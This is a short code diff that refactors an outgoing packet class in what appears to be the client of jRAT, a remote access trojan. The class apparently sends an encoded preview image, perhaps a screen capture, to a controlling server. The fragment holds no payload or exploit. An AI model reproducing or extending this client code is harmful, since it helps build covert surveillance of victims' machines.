@@ -1,9 +1,9 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
+import jrat.client.Connection;
 import jrat.common.utils.ImageUtils;
+
 import java.awt.image.BufferedImage;
-import java.io.DataOutputStream;
 
 public class Packet43PreviewImage extends AbstractOutgoingPacket {
 
@@ -14,7 +14,7 @@ public class Packet43PreviewImage extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection dos) throws Exception {
 		byte[] buffer = ImageUtils.encode(image);
 		
 		dos.writeInt(buffer.length);
